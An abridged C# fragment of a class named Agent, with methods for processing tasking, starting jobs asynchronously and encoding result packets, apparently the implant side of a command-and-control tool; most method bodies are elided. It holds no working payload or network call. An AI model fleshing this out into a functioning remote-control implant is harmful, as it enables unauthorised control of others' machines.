...
namespace Agent
{
    public class Agent
    {
        ...
        private static byte[] ProcessTasking(int type, string msg, int resultID)
        {
            ...
            {
                return EncodePacket(type, "test", resultID);
            }
        }
        ...
        private static void StartAgentJob(int type, string payload, int resultID)
        {
            ...
            try
            {
                ...
                if (pieces.Length > 0)
                {
                    ...
                    IAsyncResult result = exJob.BeginInvoke(pieces[0], parameters, ExecuteJobCallback, new string[] { type.ToString(), resultID.ToString(), saveFilePrefix, extention });
        ...
        private static string StopAgentJob(string jobName)
        {
            return null;
        }
